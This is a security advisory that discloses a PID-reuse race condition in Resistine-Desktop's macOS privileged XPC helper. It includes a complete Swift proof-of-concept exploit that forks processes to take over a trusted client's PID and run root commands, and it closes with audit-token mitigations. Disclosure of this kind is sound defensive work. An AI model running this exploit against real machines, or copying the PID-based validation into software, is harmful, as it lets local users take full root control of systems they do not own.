# Local Privilege Escalation via XPC Race Condition

## Description

A local privilege escalation vulnerability exists in the privileged helper of Resistine-Desktop.
The helper attempts to authenticate XPC clients by checking their PID (connection.processIdentifier) and retrieving code signing information based on that PID.
This approach is insecure because PIDs are recycled on macOS. An attacker can exploit a race condition between the PID check and process reuse to impersonate the legitimate client and gain access to privileged XPC methods.


## Technical Details

The [helper](https://github.com/Resistine/Resistine-Desktop/blob/db78f7a2e0af0137db8f7455a9f7c25f9d38397a/apple_helper/main.swift) implements `listener:shouldAcceptNewConnection:` and calls a custom function such as:

```swift
private func isValidClient(connection: NSXPCConnection) -> Bool {
    return CodesignCheck.codeSigningMatches(pid: connection.processIdentifier)
}
```

This approach is insecure because macOS reuses process IDs. When a legitimate client connects and exits, its PID may be reassigned to a new, unrelated process. If the helper performs its code signature verification after the original process has exited, it may unknowingly inspect the code signature of the newly spawned process instead. This opens a race window in which a local attacker can launch a malicious process that inherits the PID of a trusted client and bypass the helper's authentication.

Although the XPC system maintains a secure auditToken tied to the original client process, this helper ignores it entirely. As a result, the authentication is based on mutable process state instead of immutable cryptographic identity. An attacker who wins the race can invoke any of the exported privileged methods including root command execution. 

## Proof-of-Concept

```swift
// Exploit PoC for XPC Race Condition (PID reuse attack)
// Target: Helper authenticates using connection.processIdentifier (PID)
// Goal: Gain access to privileged methods by PID spoofing

import Foundation
import Darwin

let targetService = "com.resistine.helper"
let trustedAppPath = "/Applications/Resistine.app" // location of the app

// MARK: - Launch trusted client and capture its PID
func launchTrustedClient() -> pid_t? {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "\(trustedAppPath)/Contents/MacOS/Resistine")
    do {
        try process.run()
        print("[+] Launched trusted client with PID \(process.processIdentifier)")
        return process.processIdentifier
    } catch {
        print("[-] Failed to launch trusted client: \(error)")
        return nil
    }
}

// MARK: - Wait for PID to be freed
func waitForProcessToExit(pid: pid_t) {
    print("[*] Waiting for PID \(pid) to exit...")
    while kill(pid, 0) == 0 {
        usleep(100_000) // 100ms
    }
    print("[+] PID \(pid) is now free for reuse")
}

// MARK: - Spray processes to get same PID
func sprayUntilPidMatches(targetPid: pid_t, maxAttempts: Int = 5000) -> pid_t? {
    for _ in 0..<maxAttempts {
        let pid = fork()
        if pid == 0 {
            // Child process
            if getpid() == targetPid {
                print("[+] Reused PID \(targetPid)! Launching XPC connection...")
                runXPCExploit()
            }
            exit(0)
        } else if pid > 0 {
            waitpid(pid, nil, 0) // Reap child
        }
    }
    print("[-] Failed to reclaim PID \(targetPid) after \(maxAttempts) attempts")
    return nil
}

// MARK: - XPC Connection Attempt
@objc protocol HelperToolProtocol {
    func runCommand(command: String, withReply reply: @escaping (String) -> Void)
}

func runXPCExploit() {
    let conn = NSXPCConnection(machServiceName: targetService, options: .privileged)
    conn.remoteObjectInterface = NSXPCInterface(with: HelperToolProtocol.self)

    conn.resume()
    let proxy = conn.remoteObjectProxyWithErrorHandler { error in
        print("[-] XPC error: \(error)")
        exit(1)
    } as? HelperToolProtocol

    proxy?.runCommand(command: "id") { output in
        print("[+] Exploit succeeded, output: \n\(output)")
        exit(0)
    }
    RunLoop.main.run()
}

// MARK: - Main Flow
if let victimPid = launchTrustedClient() {
    sleep(2) // Give it time to connect to helper
    kill(victimPid, SIGKILL)
    waitForProcessToExit(pid: victimPid)
    sprayUntilPidMatches(targetPid: victimPid)
} else {
    print("[-] Could not start trusted client")
    exit(1)
}
```

example output:

```sh
[*] Connected to helper — attempting privilege escalation…
[+] Output from helper:
uid=0(root) gid=0(wheel) groups=0(wheel),...
```

## Impact

Any local unprivileged user may escalate privileges to root by exploiting the race condition in PID-based client validation.
Because the helper exports sensitive methods such as arbitrary shell execution, successful exploitation leads to full system compromise.

## Mitigation

- Do not rely on PID validation,
- use the audit token provided by NSXPCConnection.withAuditToken, which is cryptographically tied to the origin of the connection and cannot be forged or reused by another process,
- verify the connecting client’s code signing identity and team identifier via SecCodeCopySigningInformation using the audit token, not the PID,
- limit exposed methods to the minimum set required, and avoid arbitrary shell execution.

### References

- https://theevilbit.github.io/posts/secure_coding_xpc_part5/
- https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf
